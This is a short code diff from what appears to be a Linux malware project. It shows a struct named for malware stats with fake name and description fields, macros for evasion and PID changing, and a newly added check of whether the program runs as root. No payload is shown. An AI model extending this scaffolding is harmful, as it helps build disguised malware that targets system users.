@@ -1,16 +1,16 @@
 // Some Macros.
-#define RAW 0x06
-#define HEX 0x01
-#define DEC 0x02
-#define BIN 0x03
-#define TCP 0x04
-#define UDP 0x05
 
-#define SUCCEED  0
-#define PROBLEM  1
-#define OK	 0
-#define DONE     0
-#define FAILED   1
+#define ADMIN	  	 0
+#define USER	 	 1
+#define SUCCEED     	 0
+#define PROBLEM     	 1
+#define OK	   	 0
+#define DONE      	 0
+#define FAILED   	 1
+#define ON	 	 1
+#define OFF	 	 0
+#define FILE_EXIST	 1
+#define FILE_NOT_FOUND   0
 
 #define FUNCTION_EVADE int x
 
@@ -21,9 +21,6 @@
 
 #define PAMAX      4096
 
-#define ON	0x01
-#define OFF	0x00
-
 #define KEEP_PID   0x00
 #define CHANGE_PID 0x99
 
@@ -31,9 +28,6 @@
 #define OUTPUT     0x01
 #define ERROR      0x03
 
-
-#define FILE_EXIST	 0x01
-#define FILE_NOT_FOUND   0x00
 
 // Headers To Include.
 #include <iostream>
@@ -70,6 +64,8 @@ struct  c_malware_stats__t{
 	char	     fakename[155];
 	char*	     fakedescription = NULL;
 
+	int	     privileges;
+
 	size_t       size;
 };
 
@@ -92,6 +88,10 @@ void cvinit(int argc=0x00, char** argv=NULL){
 	stat(_argv__[0], &currentstat);
 	readlink("/proc/self/exe", Current.name, PAMAX);
 	Current.size=currentstat.st_size;
+
+	if (geteuid() == ADMIN)
+		Current.privileges = ADMIN;
+	else Current.privileges	   =  USER;
 
 	return;
 }
